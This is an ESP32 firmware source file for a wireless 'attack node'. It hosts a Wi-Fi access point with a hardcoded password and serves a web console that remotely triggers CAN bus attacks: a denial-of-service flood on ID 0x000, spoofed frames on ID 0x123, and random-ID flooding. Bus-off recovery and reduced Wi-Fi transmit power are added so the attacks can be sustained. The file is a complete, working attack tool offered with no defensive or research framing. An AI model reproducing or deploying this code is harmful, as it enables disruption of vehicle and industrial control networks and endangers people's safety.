#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h> // ADDED: Required for Wi-Fi power control
#include "driver/twai.h"

// --- HARDWARE PINS ---
#define TX_PIN 21 
#define RX_PIN 22 

// --- WI-FI CREDENTIALS (Access Point Mode) ---
const char* ssid = "tr0jan_hors€";
const char* password = "password123"; // Must be at least 8 chars

// --- WEB SERVER ---
WebServer server(80);

// --- ATTACK VARIABLES ---
char currentMode = '0'; 
unsigned long lastAttackTime = 0;

// ==============================================================================
// --- EMBEDDED WEBSITE FRONTEND ---
// ==============================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>CETA // ATTACK NODE</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--g:#00ff41;--g2:#00cc34;--g3:#005c18;--d:#ff003c;--bg:#000;--p:#03080
3;--b:#060f06;--t:#c8ffc8;--td:#4a8a4a;--s:#00cfff}
body{font-family:'Courier New',Courier,monospace;background:#000;color:var(--t);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.1) 0,rgba(0,0,0,0.1) 1px,transparent 1px,transparent 3px);pointer-events:none;z-index:999}
body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(0,255,65,0.07) 0,transparent 60%);pointer-events:none;z-index:0}
.wrap{width:min(860px,100%);position:relative;z-index:1}
/* HEADER */
.hdr{border:1px solid var(--g3);border-radius:3px;padding:18px 22px 14px;background:var(--p);margin-bottom:12px;box-shadow:0 0 30px rgba(0,255,65,0.1),0 0 1px var(--g3) inset;position:relative;overflow:hidden}
.hdr::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--g2),transparent)}
.hdr-top{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px}
.logo{font-size:10px;letter-spacing:3px;color:var(--g3);margin-bottom:6px}
.title{font-size:26px;font-weight:700;letter-spacing:4px;color:var(--g);text-shadow:0 0 14px rgba(0,255,65,0.8),0 0 40px rgba(0,255,65,0.3)}
.sub{font-size:10px;color:var(--td);letter-spacing:1.5px;margin-top:5px}
.pill{display:inline-flex;align-items:center;gap:7px;padding:7px 13px;border:1px solid var(--g3);border-radius:2px;font-size:10px;letter-spacing:2px;color:var(--td);background:var(--b)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--d);box-shadow:0 0 8px var(--d);flex-shrink:0;animation:blink 1s infinite}
.pill.online{border-color:#1a4a1a;color:var(--g)}
.pill.online .dot{background:var(--g);box-shadow:0 0 12px var(--g);animation:none}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
/* GRID */
.grid{display:grid;grid-template-columns:3fr 2fr;gap:12px}
@media(max-width:580px){.grid{grid-template-columns:1fr}}
.panel{border:1px solid var(--g3);border-radius:3px;padding:16px;background:var(--p);box-shadow:0 0 10px rgba(0,255,65,0.04)}
.panel h3{font-size:9px;letter-spacing:3px;color:var(--g3);padding-bottom:10px;margin-bottom:12px;border-bottom:1px solid #0a1a0a}
/* BUTTONS */
.btns{display:flex;flex-direction:column;gap:8px}
button{font-family:'Courier New',Courier,monospace;font-size:11px;font-weight:700;letter-spacing:1.2px;padding:12px 14px;border-radius:2px;cursor:pointer;width:100%;text-align:left;transition:all .15s;position:relative;overflow:hidden}
button::before{content:'';position:absolute;inset:0;opacity:0;transition:opacity .15s}
button:hover::before{opacity:1}
.b1{background:#010d01;border:1px solid #1a3a1a;color:var(--g)}
.b1:hover{border-color:var(--g2);box-shadow:0 0 16px rgba(0,255,65,0.3),0 0 4px rgba(0,255,65,0.1) inset;color:#fff}
.b2{background:#01080d;border:1px solid #0a2233;color:var(--s)}
.b2:hover{border-color:var(--s);box-shadow:0 0 16px rgba(0,207,255,0.3);color:#fff}
.b3{background:#060d01;border:1px solid #253310;color:#aaff44}
.b3:hover{border-color:#aaff44;box-shadow:0 0 16px rgba(170,255,68,0.3);color:#fff}
.b0{background:#0d0101;border:1px solid #330a0a;color:var(--d)}
.b0:hover{border-color:var(--d);box-shadow:0 0 16px rgba(255,0,60,0.3);color:#fff}
/* TERMINAL */
.term{margin-top:12px;padding:12px 14px;border-radius:2px;border:1px solid #0a1a0a;background:#010601;font-size:11px;line-height:1.9;color:var(--g2);min-height:52px;word-break:break-all}
.term::before{content:'root@esp32:~# ';color:var(--g3)}
/* STATUS PANEL */
.kv{font-size:11px;line-height:2.2;color:var(--td)}
.kv .lbl{color:var(--g3);font-size:9px;letter-spacing:2px;display:block;margin-top:6px}
.kv .val{color:var(--g);word-break:break-all}
.sep{border:none;border-top:1px solid #0a1a0a;margin:10px 0}
/* MATRIX RAIN CANVAS */
canvas{position:fixed;top:0;left:0;width:100%;height:100%;opacity:.06;pointer-events:none;z-index:0}
/* ALERT */
.alert{display:none;margin-top:10px;padding:10px 12px;border-radius:2px;border:1px solid rgba(255,0,60,.4);background:rgba(255,0,60,.06);color:#ff6680;font-size:10px;letter-spacing:1px}
.alert.show{display:block}
.foot{font-size:9px;color:#1a3a1a;margin-top:12px;letter-spacing:1px}
</style>
</head>
<body>
<canvas id="mc"></canvas>
<div class="wrap">
  <div class="hdr">
    <div class="hdr-top">
      <div>
        <div class="logo">// ESP32 WIRELESS ATTACK NODE //</div>
        <div class="title">CETA CONSOLE</div>
        <div class="sub">192.168.4.1 &nbsp;|&nbsp; TWAI / CAN BUS &nbsp;|&nbsp; REST API &nbsp;|&nbsp; 500KBPS</div>
      </div>
      <div class="pill" id="conn-pill"><span class="dot" id="conn-dot"></span><span id="conn-text">DISCONNECTED</span></div>
    </div>
  </div>
  <div class="grid">
    <div class="panel">
      <h3>[ ATTACK VECTORS ]</h3>
      <div class="btns">
        <button class="b1" data-mode="1">[M1]&nbsp; DoS ATTACK &mdash; ID 0x000 SATURATION FLOOD</button>
        <button class="b2" data-mode="2">[M2]&nbsp; SPOOFING &mdash;&nbsp; ID 0x123 PAYLOAD INJECT</button>
        <button class="b3" data-mode="3">[M3]&nbsp; FLOODING &mdash;&nbsp; RANDOM ID / DATA BURST</button>
        <button class="b0" data-mode="0">[M0]&nbsp; STANDBY &mdash;&nbsp; HALT ALL &amp; SAFE IDLE</button>
      </div>
      <div class="term" id="status-box">IDLE. AWAITING COMMAND.</div>
      <div class="alert" id="alert-box">!! LINK LOST !! Reconnect to AP and retry.</div>
    </div>
    <div class="panel">
      <h3>[ NODE TELEMETRY ]</h3>
      <div class="kv">
        <span class="lbl">ENDPOINT</span>
        <span class="val">192.168.4.1/api/attack?mode=X</span>
        <hr class="sep"/>
        <span class="lbl">LAST COMMAND</span>
        <span class="val" id="last-cmd">none</span>
        <hr class="sep"/>
        <span class="lbl">SERVER RESPONSE</span>
        <span class="val" id="last-result">n/a</span>
        <hr class="sep"/>
        <span class="lbl">BUS SPEED</span>
        <span class="val">500 KBPS &nbsp;|&nbsp; CAN 2.0A</span>
      </div>
      <div class="foot">// NO EXTERNAL DEPS // ALL ASSETS INLINED //</div>
    </div>
  </div>
</div>
<script>
/* Matrix rain - very lightweight canvas effect */
(()=>{
  const c=document.getElementById('mc');
  const x=c.getContext('2d');
  const R=()=>{c.width=window.innerWidth;c.height=window.innerHeight};
  R();window.addEventListener('resize',R);
  const ch='アイウエオカキクケコ0123456789ABCDEF';
  const fs=14;
  let cols=[],drops=[];
  const init=()=>{cols=Math.floor(c.width/fs);drops=Array(cols).fill(1)};
  init();window.addEventListener('resize',init);
  setInterval(()=>{
    x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,c.width,c.height);
    x.fillStyle='#00ff41';x.font=fs+'px monospace';
    for(let i=0;i<drops.length;i++){
      x.fillText(ch[Math.floor(Math.random()*ch.length)],i*fs,drops[i]*fs);
      if(drops[i]*fs>c.height&&Math.random()>0.975)drops[i]=0;
      drops[i]++;
    }
  },50);
})();

/* API control */
(()=>{
  const API='http://192.168.4.1/api/attack?mode=';
  const sb=document.getElementById('status-box');
  const ab=document.getElementById('alert-box');
  const cp=document.getElementById('conn-pill');
  const ct=document.getElementById('conn-text');
  const lc=document.getElementById('last-cmd');
  const lr=document.getElementById('last-result');
  const L={0:'M0 STANDBY - HALT',1:'M1 DoS - 0x000 FLOOD',2:'M2 SPOOF - 0x123',3:'M3 FLOOD - RANDOM BURST'};
  const online=ok=>{
    ok?(cp.classList.add('online'),ct.textContent='ONLINE',ab.classList.remove('show'))
      :(cp.classList.remove('online'),ct.textContent='DISCONNECTED',ab.classList.add('show'));
  };
  const send=async m=>{
    sb.textContent='EXECUTING: '+(L[m]||m)+'...';
    try{
      const ctl=new AbortController,t=setTimeout(()=>ctl.abort(),4000);
      const r=await fetch(API+m,{method:'GET',signal:ctl.signal});
      clearTimeout(t);
      if(!r.ok)throw new Error('HTTP '+r.status);
      const tx=await r.text();
      online(true);lc.textContent=L[m]||m;lr.textContent='ACK '+tx.trim();
      sb.textContent='[OK] '+(L[m]||m)+' ACTIVE';
    }catch(e){
      online(false);lr.textContent='FAIL: '+e.message;
      sb.textContent='[ERR] COMMAND FAILED - '+e.message;
    }
  };
  document.querySelectorAll('[data-mode]').forEach(b=>b.addEventListener('click',()=>send(b.getAttribute('data-mode'))));
  online(false);
})();
</script>
</body>
</html>
)rawliteral";
// ==============================================================================

// --- API ENDPOINT HANDLER ---
void handleCommand() {
  // 1. Bypass CORS so your custom frontend isn't blocked
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.sendHeader("Access-Control-Allow-Methods", "GET");

  // 2. Read the command from the URL (e.g., /api/attack?mode=1)
  if (server.hasArg("mode")) {
    char newMode = server.arg("mode").charAt(0);
    
    // 3. Validate and apply the command
    if (newMode == '0' || newMode == '1' || newMode == '2' || newMode == '3') {
      currentMode = newMode;
      server.send(200, "text/plain", "SUCCESS: Weapon Mode Updated");
      Serial.print("\n[WIRELESS COMMAND] >>> MODE CHANGED TO: [");
      Serial.print(currentMode);
      Serial.println("] <<<");
    } else {
      server.send(400, "text/plain", "ERROR: Invalid Mode");
    }
  } else {
    server.send(400, "text/plain", "ERROR: Missing 'mode' parameter");
  }
}

void setup() {
  Serial.begin(115200);
  while (!Serial);

  Serial.println("\n=== ESP32 WIRELESS WEAPONIZED NODE ===");

  // 1. START WI-FI ACCESS POINT
  Serial.print("Broadcasting Wi-Fi Network: ");
  Serial.println(ssid);
  WiFi.softAP(ssid, password);
  
  // ADDED: Cut Wi-Fi transmit power in half to prevent brownout resets during attacks.
  esp_wifi_set_max_tx_power(40); 
  
  // The default IP for ESP32 AP mode is always 192.168.4.1
  Serial.print("Weapon IP Address: ");
  Serial.println(WiFi.softAPIP());

  // 2. START WEB SERVER API
  
  // ---> NEW ROUTE: Serve the embedded HTML website <---
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", index_html);
  });
  
  server.on("/api/attack", handleCommand); // Route for your frontend commands
  server.begin();
  Serial.println("REST API Server Started.");

  // 3. START TWAI (CAN) HARDWARE
  twai_general_config_t g_config = TWAI_GENERAL_CONFIG_DEFAULT((gpio_num_t)TX_PIN, (gpio_num_t)RX_PIN, TWAI_MODE_NORMAL);
  twai_timing_config_t t_config = TWAI_TIMING_CONFIG_500KBITS(); 
  twai_filter_config_t f_config = TWAI_FILTER_CONFIG_ACCEPT_ALL(); 

  twai_driver_install(&g_config, &t_config, &f_config);
  twai_start();
  
  Serial.println("Hardware Armed. Awaiting wireless commands...\n");
}

void loop() {
  // --- 1. LISTEN FOR WIRELESS COMMANDS ---
  server.handleClient(); // This keeps the web server alive

  // --- 2. HARDWARE CRASH MONITOR (Stay in the fight) ---
  twai_status_info_t status;
  twai_get_status_info(&status);
  
  if (status.state == TWAI_STATE_BUS_OFF) {
    Serial.println("\n[CRASH] Bus-Off! Hardware rejected the attack.");
    Serial.println("Suspending attacks to prevent kernel panic... Recovering...");
    
    currentMode = '0'; // IMMEDIATELY STOP ATTACKING
    
    twai_initiate_recovery();
    delay(250);
    twai_start();
    
    Serial.println("Recovery complete. Weapon in STANDBY.");
  }

  // --- 3. THE ATTACK ENGINE ---
  if (status.state == TWAI_STATE_RUNNING) {
    unsigned long now = millis();
    twai_message_t attack_msg;

    switch (currentMode) {
      case '0':
        // Standby
        break;

      case '1': // AGGRESSIVE DoS
        if (now - lastAttackTime >= 1) {
          attack_msg.identifier = 0x000;
          attack_msg.extd = 0;
          attack_msg.rtr = 0;
          attack_msg.data_length_code = 8;
          for(int i=0; i<8; i++) attack_msg.data[i] = 0x00;
          
          // CHANGED: 0 ticks makes transmission non-blocking
          twai_transmit(&attack_msg, 0); 
          lastAttackTime = now;
        }
        break;

      case '2': // SPOOFING
        if (now - lastAttackTime >= 30) {
          attack_msg.identifier = 0x123;
          attack_msg.extd = 0;
          attack_msg.rtr = 0;
          attack_msg.data_length_code = 2;
          attack_msg.data[0] = 0xFF; 
          attack_msg.data[1] = 0xFF; 
          
          // CHANGED: 0 ticks makes transmission non-blocking
          twai_transmit(&attack_msg, 0); 
          lastAttackTime = now;
        }
        break;

      case '3': // FLOODING
        if (now - lastAttackTime >= 2) {
          attack_msg.identifier = random(0x001, 0x7FF); 
          attack_msg.extd = 0;
          attack_msg.rtr = 0;
          attack_msg.data_length_code = random(1, 9);  
          for(int i=0; i<attack_msg.data_length_code; i++) {
            attack_msg.data[i] = random(0x00, 0xFF);
          }
          
          // CHANGED: 0 ticks makes transmission non-blocking
          twai_transmit(&attack_msg, 0); 
          lastAttackTime = now;
        }
        break;
    }
  }

  // ADDED: Give background Wi-Fi tasks time to breathe, preventing disconnects
  yield(); 
}
